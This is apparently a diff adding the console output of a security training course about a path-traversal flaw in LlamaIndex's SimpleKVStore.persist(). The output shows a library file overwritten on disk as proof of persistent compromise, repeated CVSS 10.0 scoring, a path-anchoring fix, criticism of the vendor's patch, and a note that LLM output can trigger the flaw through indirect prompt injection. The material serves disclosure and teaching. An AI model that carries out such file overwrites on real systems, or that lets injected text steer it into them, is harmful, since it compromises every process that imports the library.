+  3. Any subsequent 'import llama_index' triggers the payload
+
+  ⚠️  PERSISTENT COMPROMISE (CVSS Scope Change)
+  This is NOT a transient RCE. The framework source code is modified on disk.
+  All future Python processes importing llama_index will execute the payload.
+
+╔══════════════════════════════════════════════════════════════════╗
+║                     EXPLOIT IMPACT & CVSS SCORE                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  CVSS Score    : 10.0 CRITICAL
+║  Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+║  Scope (S)     : CHANGED (S:C) -> Process Boundary Crossed
+║  Confidentiality: HIGH (Arbitrary System File Read)
+║  Integrity      : HIGH (Library & Configuration Overwrite)
+║  Availability   : HIGH (Framework Corruption / Denial of Service)
+╚══════════════════════════════════════════════════════════════════╝
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 5: Scope Change Proof (Persistent Compromise)
+══════════════════════════════════════════════════════════════════════
+  Objective: Verify the compromise survives across process boundaries.
+
+[*] Checking current state...
+{
+  "clean": false,
+  "exists": true,
+  "file": "/usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py",
+  "markers_found": [
+    "PERSISTENT COMPROMISE"
+  ],
+  "size_bytes": 113,
+  "status": "compromised"
+}
+
+[✓] SCOPE CHANGE CONFIRMED!
+    The framework source file has been modified on disk.
+    Markers: ['PERSISTENT COMPROMISE']
+
+  This proves the exploit achieved CVSS Scope Change (S:C).
+  The compromise is NOT transient - it persists in the filesystem.
+  Any new Python process importing llama_index will be affected.
+
+  ⚠️  WHY THIS MATTERS ═══
+  The vendor's shadow patch (deleting dataset.py) did NOT fix this.
+  SimpleKVStore.persist() remains vulnerable in ALL versions.
+  Without a CVE, SCA scanners will NOT flag this in enterprise environments.
+
+╔══════════════════════════════════════════════════════════════════╗
+║                     EXPLOIT IMPACT & CVSS SCORE                  ║
+╠══════════════════════════════════════════════════════════════════╣
+║  CVSS Score    : 10.0 CRITICAL
+║  Vector        : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+║  Scope (S)     : CHANGED (S:C) -> Process Boundary Crossed
+║  Confidentiality: HIGH (Arbitrary System File Read)
+║  Integrity      : HIGH (Library & Configuration Overwrite)
+║  Availability   : HIGH (Framework Corruption / Denial of Service)
+╚══════════════════════════════════════════════════════════════════╝
+
+
+══════════════════════════════════════════════════════════════════════
+  LESSON 6: Mitigation Strategies
+══════════════════════════════════════════════════════════════════════
+  Objective: Understand the architectural fix vs. band-aid patches.
+
+═══ PROPOSED FIX: Path Anchoring ═══
+
+  Correct Pattern:
+  from pathlib import Path
+  
+  def get_anchored_path(safe_root: str, user_input: str) -> Path:
+      base_dir = Path(safe_root).resolve()
+      target_path = (base_dir / user_input).resolve()
+      if not target_path.is_relative_to(base_dir):
+          raise PermissionError('Path Traversal Blocked!')
+      return target_path
+
+═══ WHY THE VENDOR'S 'FIX' IS INCOMPLETE ═══
+
+  1. Deleting dataset.py (Stage 1)
+     - Removed the PoC target, did NOT fix root cause
+     - SimpleKVStore.persist() left unprotected
+
+  2. Migrating logic to workflows (Stage 2)
+     - Path sanitization only in workflows sub-package
+     - Core storage module (SimpleKVStore) never patched
+
+  3. No CVE Assignment
+     - SCA scanners show no alerts for affected versions
+     - Enterprise deployments remain blind to the risk
+
+═══ WHAT A REAL FIX REQUIRES ═══
+
+  ✓ Path Anchoring: Mandatory .resolve() + is_relative_to() on ALL file I/O
+  ✓ Type-Safe Sinks: Strict path type validation before any file operation
+  ✓ Centralized I/O: Single audited file utility instead of scattered sinks
+  ✓ CVE Assignment: Public disclosure so SCA scanners can detect vulnerable versions
+
+══════════════════════════════════════════════════════
+  GUIDED COURSE COMPLETE!
+══════════════════════════════════════════════════════
+
+  Key Takeaway:
+  The vendor deleted dataset.py (Stage 1) and migrated logic to
+  workflows (Stage 2), but SimpleKVStore.persist() was NEVER patched.
+  It remains exploitable in ALL versions.
+
+  Lessons Learned:
+  ✓ CWE-22 Path Traversal leads to arbitrary file write
+  ✓ SimpleKVStore.persist() has no path validation
+  ✓ LLM output can weaponize this via indirect prompt injection
+  ✓ Shadow patching leaves the root cause unaddressed
+  ✓ Without a CVE, SCA scanners give false negatives
+
+  Reference: JDP-2026-003 (https://jdp-security.github.io/security-research-papers/2026-05-12-llamaindex-selfnuke-disclosure.html) | CVSS 10.0 (Critical)
+
+  Try Lesson 7 (Custom Payload Sandbox) to build your own exploits!
+
+  
